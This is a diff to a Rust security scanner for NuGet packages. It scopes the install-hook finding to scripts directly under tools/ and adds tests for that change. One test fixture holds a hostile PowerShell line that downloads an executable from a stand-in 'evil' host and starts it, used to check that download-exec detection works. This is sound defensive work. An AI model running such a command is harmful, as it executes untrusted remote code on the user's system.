@@ -236,12 +236,22 @@ fn is_msbuild_autoimport(lower_rel: &str) -> bool {
             || lower_rel.starts_with("buildmultitargeting/"))
 }
 
-/// Flag install-hook scripts by canonical name. Path-only: runs before the
+/// Flag install-hook scripts by canonical path. Path-only: runs before the
 /// size cap so a padded `tools/install.ps1` is still surfaced.
+///
+/// NuGet only auto-runs install hooks (`init.ps1` / `install.ps1` /
+/// `uninstall.ps1`) when they sit *directly* under the package root `tools/`
+/// directory. A same-named script elsewhere (e.g. `docs/install.ps1` or
+/// `contentFiles/.../install.ps1`) is never auto-executed, so it must not
+/// produce this High install-hook finding. Generic PowerShell *content*
+/// scanning still applies to every `.ps1` regardless of location — only the
+/// install-hook *path* signal is scoped here.
 fn scan_powershell_name(rel: &str, findings: &mut Vec<Finding>) {
     let lower = rel.to_ascii_lowercase();
-    let base = lower.rsplit('/').next().unwrap_or(&lower);
-    if matches!(base, "init.ps1" | "install.ps1" | "uninstall.ps1") {
+    if matches!(
+        lower.as_str(),
+        "tools/init.ps1" | "tools/install.ps1" | "tools/uninstall.ps1"
+    ) {
         findings.push(finding(
             "nuget-install-script",
             Severity::High,
@@ -401,6 +411,48 @@ mod tests {
         let mut f = Vec::new();
         scan_powershell_name("tools/install.ps1", &mut f);
         assert!(f.iter().any(|x| x.rule_id == "nuget-install-script"));
+    }
+
+    #[test]
+    fn powershell_install_hook_outside_tools_not_flagged() {
+        // NuGet only auto-runs install hooks placed directly under `tools/`.
+        // A same-named script elsewhere must not produce the install-hook
+        // finding.
+        for rel in [
+            "docs/install.ps1",
+            "contentFiles/any/net6.0/install.ps1",
+            "build/init.ps1",
+            "uninstall.ps1",
+            "tools/sub/install.ps1",
+        ] {
+            let mut f = Vec::new();
+            scan_powershell_name(rel, &mut f);
+            assert!(
+                !f.iter().any(|x| x.rule_id == "nuget-install-script"),
+                "`{rel}` must not produce nuget-install-script"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_content_scanned_outside_tools() {
+        // A malicious `.ps1` outside `tools/` still gets content-scanned even
+        // though it is not an auto-run install hook.
+        let mut f = Vec::new();
+        scan_powershell_name("docs/install.ps1", &mut f);
+        scan_powershell_content(
+            "Invoke-WebRequest http://evil/x -OutFile p.exe; Start-Process p.exe",
+            "docs/install.ps1",
+            &mut f,
+        );
+        assert!(
+            !f.iter().any(|x| x.rule_id == "nuget-install-script"),
+            "docs/install.ps1 must not be an install-hook finding"
+        );
+        assert!(
+            f.iter().any(|x| x.rule_id == "powershell-download-exec"),
+            "content scan must still flag download-exec outside tools/"
+        );
     }
 
     #[test]
